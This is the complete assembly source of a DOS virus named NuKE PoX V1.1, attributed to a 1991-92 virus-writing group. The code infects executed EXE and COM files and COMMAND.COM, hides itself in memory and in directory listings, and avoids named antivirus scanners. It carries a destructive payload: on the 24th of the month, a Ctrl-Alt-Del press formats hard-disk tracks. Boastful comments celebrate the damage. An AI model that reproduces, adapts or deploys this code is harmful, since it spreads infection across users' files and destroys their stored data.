;*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-
;-*      (c) Rock Steady, Viral Developments                             -*
;*-      (c) NuKE Software Developement  1991, 1992                      *-
;-*  Virus: NuKE PoX Version 1.1  (Alias: Evil Genius, NPox)             -*
;*-  ~~~~~~                                                              *-
;-*  Notes: Resident EXE & COM Infecting, Memory Stealth, Directory      -*
;*-  ~~~~~~ Stealth (FCB Method), Anti-Viral Products Aware, Infects     *-
;-*         COMMAND.COM on first Run, CTRL-ALT-DEL Aware...              -*
;*-  Bytes: 963 Bytes           Memory: 963 Bytes                        *-
;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*
virus_size      equ     last - init_virus                                  
mut1            equ     3                                                  
mut2            equ     1                                                  
mut3            equ     103h                                               
del_code        equ     53h                                                
                                                                           
seg_a           segment byte public                                        
                assume  cs:seg_a, ds:seg_a                                 
                org     100h                                               
rocko           proc    far                                                
                                                                           
start:          jmp     init_virus                                         
;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*- 
;                       Virus Begins Here...                               
;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*- 
init_virus:                                                                
                call    doit_now               ;Doit VirusMan...           
                                                                           
doit_now:       pop     bp                     ;Not to Lose Track          
                sub     bp,106h                ;Set our position           
                push    ax                     ;Save all the registers     
                push    bx                                                 
                push    cx                                                 
                push    dx                                                 
                push    si                                                 
                push    di                                                 
                push    bp                                                 
                push    es                                                 
                push    ds                                                 
                                                                           
                mov     ax,7bcdh               ;Are we resident Already?   
                int     21h                                                
                cmp     bx,7bcdh               ;Yupe... Quit Then...       
                je      exit_com                                           
                                                                           
                xor     bx,bx                                              
                push    cs                     ;Get CS=DS                  
                pop     ds                                                 
                mov     cx,es                                              
                                                                           
                mov     ax,3509h               ;Hook Int 9 Please...       
                int     21h                                                
                mov     word ptr cs:[int9+2][bp],es                        
                mov     word ptr cs:[int9][bp],bx                          
                                                                           
                mov     ax,3521h               ;Sometimes tend to intercept
                int     21h                    ;This Interrupt...          
                mov     word ptr cs:[int21+2][bp],es    ;Save the Int      
                mov     word ptr cs:[int21][bp],bx      ;Vector Table      
                                                                           
                dec     cx                     ;Get a new Memory block     
                mov     es,cx                  ;Put it Back to ES          
                mov     bx,es:mut1                                         
                mov     dx,virus_size          ;Size to `Hide'             
                mov     cl,4                   ;And all this crap hides    
                shr     dx,cl                  ;your number od bytes in DX 
                add     dx,4                                               
                mov     cx,es                                              
                sub     bx,dx                                              
                inc     cx                                                 
                mov     es,cx                                              
                mov     ah,4ah                 ;Call int to do it...       
                int     21h                                                
                                                                           
                jc      exit_com                                           
                mov     ah,48h                                             
                dec     dx                                                 
                mov     bx,dx                  ;It's Done... Yeah!         
                int     21h                                                
                                                                           
                jc      exit_com                                           
                dec     ax                                                 
                mov     es,ax                                              
                mov     cx,8h                  ;Here we move our Virus into
                mov     es:mut2,cx             ;the `Hidden' memory!       
                sub     ax,0fh                                             
                mov     di,mut3                                            
                mov     es,ax                                              
                mov     si,bp                                              
                add     si,offset init_virus                               
                mov     cx,virus_size                                      
                cld                                                        
                repne   movsb                                              
                                                                           
                mov     ax,2521h                ;Restore Int21 with ours   
                mov     dx,offset int21_handler ;Where it starts           
                push    es                                                 
                pop     ds                                                 
                int     21h                                                
                                                                           
                mov     ax,2509h               ;Restore Int9 with ours     
                mov     dx,offset int9_handler ;The Handler...             
                int     21h                                                
                                                                           
                push    cs                                                 
                pop     ds                                                 
exit_com:                                                                  
                cmp     word ptr cs:[buffer][bp],5A4Dh                     
                je      exit_exe_file          ;Its an EXE file...         
                mov     bx,offset buffer       ;Its a COM file restore     
                add     bx,bp                  ;First three Bytes...       
                mov     ax,[bx]                ;Mov the Byte to AX         
                mov     word ptr ds:[100h],ax  ;First two bytes Restored   
                add     bx,2                   ;Get the next Byte          
                mov     al,[bx]                ;Move the Byte to AL        
                mov     byte ptr ds:[102h],al  ;Restore the Last of 3 Bytes
                pop     ds                                                 
                pop     es                                                 
                pop     bp                     ;Restore Regesters          
                pop     di                                                 
                pop     si                                                 
                pop     dx                                                 
                pop     cx                                                 
                pop     bx                                                 
                pop     ax                                                 
                mov     ax,100h                ;Jump Back to Beginning     
                push    ax                     ;Restores our IP (a CALL    
                retn                           ;Saves them, now we changed 
int21           dd      ?                      ;Our Old Int21              
int9            dd      ?                      ;Our Old Int9               
                                                                           
exit_exe_file:                                                             
                mov     bx,word ptr cs:[buffer+22][bp]  ;Load CS Regester  
                mov     dx,cs                                              
                sub     dx,bx                                              
                mov     ax,dx                                              
                add     ax,word ptr cs:[exe_cs][bp]        ;Get original CS
                add     dx,word ptr cs:[exe_ss][bp]        ;Get original SS
                mov     bx,word ptr cs:[exe_ip][bp]        ;Get original IP
                mov     word ptr cs:[fuck_yeah][bp],bx     ;Restore IP     
                mov     word ptr cs:[fuck_yeah+2][bp],ax   ;Restore CS     
                mov     ax,word ptr cs:[exe_sp][bp]        ;Get original SP
                mov     word ptr cs:[Rock_Fix1][bp],dx     ;Restore SS     
                mov     word ptr cs:[Rock_Fix2][bp],ax     ;Restore SP     
                pop     ds                                                 
                pop     es                                                 
                pop     bp                                                 
                pop     di                                                 
                pop     si                                                 
                pop     dx                                                 
                pop     cx                                                 
                pop     bx                                                 
                pop     ax                                                 
                db      0B8h                   ;This is now a MOV AX,XXXX  
Rock_Fix1:                                     ;XXXX is the original SS    
                dw      0                      ;Our XXXX Value             
                cli                            ;Disable Interrupts         
                mov     ss,ax                  ;Mov it to SS               
                db      0BCh                   ;This is now a MOV SP,XXXX  
Rock_Fix2:                                                                 
                dw      0                      ;The XXXX Value for SP      
                sti                            ;Enable interrupts          
                db      0EAh                   ;JMP XXXX:YYYY              
fuck_yeah:                                                                 
                dd      0                      ;Dword IP:CS (Reverse order!
;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*- 
;                       Int 9 Handler                                      
;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*- 
int9_handler:                                  ;Every TIME a KEY is pressed
                push    ax                     ;This ROUTINE is called!    
                in      al,60h                 ;Has the user attempted a   
                cmp     al,del_code            ;CTRL-ALT-DEL               
                je      warm_reboot            ;Yes! Screw him             
bye_bye:        pop     ax                                                 
                jmp     dword ptr cs:[int9]    ;Nope, Leave system alone   
warm_reboot:                                                               
                mov     ah,2ah                 ;Get Date Please            
                int     21h                                                
                cmp     dl,18h                 ;Is it 24th of the Month?   
                jne     bye_bye                ;Yes, bye_Bye HD            
                mov     ch,0                                               
hurt_me:        mov     ah,05h                                             
                mov     dh,0                                               
                mov     dl,80h                 ;Formats a few tracks...    
                int     13h                    ;Hurts So good...           
                inc     ch                                                 
                cmp     ch,20h                                             
                loopne  hurt_me                                            
                db      0eah,0f0h,0ffh,0ffh,0ffh  ;Reboot!                 
                iret                                                       
;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*- 
;                       Dir Handler                                        
;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*- 
dir_handler:                                                               
                pushf                                                      
                push    cs                                                 
                call    int21call              ;Get file Stats             
                test    al,al                  ;Good FCB?                  
                jnz     no_good                ;nope                       
                push    ax                                                 
                push    bx                                                 
                push    es                                                 
                mov     ah,51h                 ;Is this Undocmented? huh...
                int     21h                                                
                                                                           
                mov     es,bx                                              
                cmp     bx,es:[16h]                                        
                jnz     not_infected           ;Not for us man...          
                mov     bx,dx                                              
                mov     al,[bx]                                            
                push    ax                                                 
                mov     ah,2fh                 ;Get file DTA               
                int     21h                                                
                                                                           
                pop     ax                                                 
                inc     al                                                 
                jnz     fcb_okay                                           
                add     bx,7h                                              
fcb_okay:       mov     ax,es:[bx+17h]                                     
                and     ax,1fh                 ;UnMask Seconds Field       
                xor     al,1dh                 ;Is in 58 seconds?          
                jnz     not_infected           ;Nope...                    
                and     byte ptr es:[bx+17h],0e0h                          
                sub     es:[bx+1dh],virus_size    ;Yes minus virus size    
                sbb     es:[bx+1fh],ax                                     
not_infected:   pop     es                                                 
                pop     bx                                                 
                pop     ax                                                 
no_good:        iret                                                       
;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*- 
;                       Int 21 Handler                                     
;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*- 
int21_handler:                                                             
                cmp     ax,4b00h               ;File executed              
                je      execute                                            
                cmp     ah,11h                 ;Dir handler                
                je      dir_handler                                        
                cmp     ah,12h                 ;Next file Dir handler      
                je      dir_handler                                        
                cmp     ax,7bcdh               ;Virus testing              
                jne     int21call                                          
                jmp     execute                                            
int21call:                                                                 
                jmp     dword ptr cs:[int21]   ;Split...                   
execute:                                                                   
                push    ax                                                 
                push    bx                                                 
                push    cx                                                 
                push    dx                                                 
                push    si                                                 
                push    di                                                 
                push    es                                                 
                push    ds                                                 
                                                                           
                cmp     ax,7bcdh               ;Was Virus testing if it was
                jne     continue               ;Alive? If No Continue      
                push    cs                                                 
                pop     ds                     ;If Yes, Check if COMMAND.CO
                mov     dx,offset command      ;Is infected! And return    
                jmp     continue2                                          
continue:                                                                  
                call    check_name             ;Make sure file executed    
                jc      exit_now               ;Ain't a Anti-Viral program 
continue2:                                     ;With the CRC-32 checkers   
                mov     ax,4300h               ;Get file Attribs           
                int     21h                                                
                jc      exit                                               
                                                                           
                test    cl,1h                  ;Make sure there normal     
                jz      open_file              ;Okay there are             
                and     cl,0feh                ;Nope, Fix them...          
                mov     ax,4301h               ;Save them now              
                int     21h                                                
                jc      exit                                               
                                                                           
open_file:      mov     ax,3D02h                                           
                int     21h                    ;Open File to Infect please 
                                                                           
                jc      exit                   ;Error Split                
                mov     bx,ax                  ;BX File handler            
                mov     ax,5700h               ;Get file TIME + DATE       
                int     21h                                                
                                                                           
                mov     al,cl                                              
                or      cl,1fh                 ;Un mask Seconds            
                dec     cx                     ;60 seconds                 
                dec     cx                     ;58 seconds                 
                xor     al,cl                  ;Is it 58 seconds?          
                jz      exit                   ;File already infected      
                                                                           
                push    cs                                                 
                pop     ds                                                 
                mov     word ptr ds:[old_time],cx       ;Save Time         
                mov     word ptr ds:[old_date],dx       ;Save Date         
                                                                           
                mov     ah,3Fh                                             
                mov     cx,20h                                             
                mov     dx,offset ds:[buffer]  ;Read first 20h bytes       
                int     21h                                                
                                                                           
                jc      exit_now               ;Error Split                
                mov     ax,4202h               ;Move file pointer to end of
                xor     cx,cx                  ;file...                    
                xor     dx,dx                                              
                int     21h                                                
                                                                           
                jc      exit_now                       ;Error Split        
                cmp     word ptr cs:[buffer],5A4Dh     ;Is file an EXE?    
                je      exe_file                       ;JMP to EXE Infector
                mov     cx,ax                                              
                sub     cx,3                           ;Set the JMP        
                mov     word ptr cs:[jump_address+1],cx                    
                call    infect_me                      ;Infect!            
                jc      exit_now                       ;error split        
                mov     ah,40h                         ;Write back the firs
                mov     dx,offset ds:[jump_address]    ;bytes              
                mov     cx,3h                                              
                int     21h                                                
exit_now:                                                                  
                mov     cx,word ptr cs:[old_time]      ;Restore old time   
                mov     dx,word ptr cs:[old_date]      ;Restore Old date   
                mov     ax,5701h                                           
                int     21h                                                
exit_now2:                                                                 
                mov     ah,3Eh                                             
                int     21h                     ;Close File now...         
exit:                                                                      
                pop     ds                                                 
                pop     es                                                 
                pop     di                                                 
                pop     si                                                 
                pop     dx                                                 
                pop     cx                                                 
                pop     bx                                                 
                pop     ax                                                 
                cmp     ax,7bcdh                ;Virus checking if alive   
                jne     leave_now               ;No, Exit normally         
                mov     bx,ax                   ;Yes, Fix BX with codez    
leave_now:                                                                 
                jmp     dword ptr cs:[int21]    ;Jmp back to whatever      
exe_file:                                                                  
                mov     cx,word ptr cs:[buffer+20]     ;IP Regester        
                mov     word ptr cs:[exe_ip],cx        ;Save IP Regester   
                mov     cx,word ptr cs:[buffer+22]     ;CS Regester        
                mov     word ptr cs:[exe_cs],cx        ;Save CS Regester   
                mov     cx,word ptr cs:[buffer+16]     ;SP Regester        
                mov     word ptr cs:[exe_sp],cx        ;Save SP Regester   
                mov     cx,word ptr cs:[buffer+14]     ;SS Regester        
                mov     word ptr cs:[exe_ss],cx        ;Save SS Regester   
                push    ax                                                 
                push    dx                                                 
                call    multiply                       ;Figure a new CS:IP 
                sub     dx,word ptr cs:[buffer+8]                          
                mov     word ptr cs:[buffer+22],dx     ;Restore New CS     
                mov     word ptr cs:[buffer+20],ax     ;Restore New IP     
                pop     dx                                                 
                pop     ax                                                 
                add     ax,virus_size                                      
                adc     dx,0                                               
                push    ax                                                 
                push    dx                                                 
                call    multiply                      ;Figure a new SS:SP  
                sub     dx,word ptr cs:[buffer+8]     ;Exe Size (512 Usuall
                add     ax,40h                                             
                mov     word ptr cs:[buffer+14],dx    ;New SS Pointer      
                mov     word ptr cs:[buffer+16],ax    ;New SP Pointer      
                pop     dx                                                 
                pop     ax                                                 
                                                                           
                push    bx                                                 
                push    cx                                                 
                mov     cl,7                          ;Fix for Header for  
                shl     dx,cl                         ;new file size in 512
                                                      ;byte pages          
                mov     bx,ax                                              
                mov     cl,9                          ;And the remainder   
                shr     bx,cl                         ;after dividing by   
                                                      ;512...              
                add     dx,bx                                              
                and     ax,1FFh                                            
                jz      outta_here                                         
                inc     dx                                                 
outta_here:                                                                
                pop     cx                                                 
                pop     bx                                                 
                                                                           
                mov     word ptr cs:[buffer+2],ax     ;Save Remainder      
                mov     word ptr cs:[buffer+4],dx     ;Save Size in 512 pag
                call    infect_me                     ;INFECT File! Yeah!  
                jc      exit_exe                                           
                                                                           
                mov     ah,40h                  ;Write NEW EXE Header back 
                mov     dx,offset ds:[buffer]   ;to EXE File! Points to    
                mov     cx,20h                  ;The Virus Now!!! ehhe     
                int     21h                                                
exit_exe:                                                                  
                jmp     exit_now                                           
                                                                           
rocko           endp                                                       
                                                                           
exe_ip          dw      0               ;Original IP,CS,SP,SS From EXE     
exe_cs          dw      0               ;Header!                           
exe_sp          dw      0                                                  
exe_ss          dw      0                                                  
;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*- 
;                   Infection Routine...                                   
;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*- 
infect_me       proc    near                                               
                mov     ah,40h                  ;Write the New Encrypted   
                mov     dx,offset init_virus    ;Virus to File!            
                mov     cx,virus_size                                      
                int     21h                                                
                                                                           
                jc      exit_error              ;Error Split               
                mov     ax,4200h                                           
                xor     cx,cx                   ;Pointer back to beginning 
                xor     dx,dx                   ;file!                     
                int     21h                                                
                                                                           
                jc      exit_error              ;Split Dude...             
                clc                             ;Clear carry flag          
                retn                                                       
exit_error:                                                                
                stc                             ;Set carry flag            
                retn                                                       
infect_me       endp                                                       
;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*- 
;      Fix EXE Header...Gets new SS, CS Values for EXEs headers            
;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*- 
multiply                proc    near                                       
                push    bx                                                 
                push    cx                                                 
                mov     cl,0Ch                                             
                shl     dx,cl                                              
                                                                           
                mov     bx,ax                                              
                mov     cl,4                                               
                shr     bx,cl                                              
                                                                           
                add     dx,bx                                              
                and     ax,0Fh                                             
                pop     cx                                                 
                pop     bx                                                 
                retn                                                       
multiply                endp                                               
;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*- 
;       Check to see if an `Anti-Viral' Product is being executed.         
;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*- 
check_name              proc    near                                       
                push    si                                                 
                push    cx                                                 
                                                                           
                mov     si,dx                                              
                mov     cx,128h                                            
loop_me:                                                                   
                cmp     byte ptr ds:[si],2Eh    ;Find ASCIIZ String        
                je      next_ok                                            
                inc     si                                                 
                loop    loop_me                                            
next_ok:                                                                   
                cmp     ds:[si-2],'TO'          ;Is it ??PROT.EXE (F-PROT) 
                jne     next_1                  ;Naaa                      
                cmp     ds:[si-4],'RP'                                     
                je      bad_file                ;Yupe...                   
next_1:                                                                    
                cmp     ds:[si-2],'NA'          ;Is it SCAN.EXE (McAffee)  
                jne     next_2                  ;Naaa                      
                cmp     ds:[si-4],'CS'                                     
                je      bad_file                ;Yupe...                   
next_2:                                                                    
                cmp     ds:[si-2],'NA'          ;is it ?LEAN.EXE (Clean.EXE
                jne     next_3                  ;Naaa                      
                cmp     ds:[si-4],'EL'                                     
                je      bad_file                ;Yupe...                   
next_3:                                                                    
                pop     cx                                                 
                pop     si                      ;good file Set CARRY FLAG  
                clc                             ;to normal                 
                retn                                                       
bad_file:                                                                  
                pop     cx                      ;Bad file, Set CARRY FLAG  
                pop     si                      ;ON!!!                     
                stc                                                        
                retn                                                       
check_name              endp                                               
                                                                           
command         db      "C:\COMMAND.COM",0      ;What to infect!           
old_time        dw      ?                                                  
old_date        dw      ?                                                  
jump_address    db      0E9h,90h,90h                                       
buffer          db      90h,0CDh,020h                                      
                db      30h DUP (?)                                        
msg             db      "NukE PoX V1.1 - R.S"                              
last:                                                                      
seg_a           ends                                                       
                                                                           
                end     start                                              
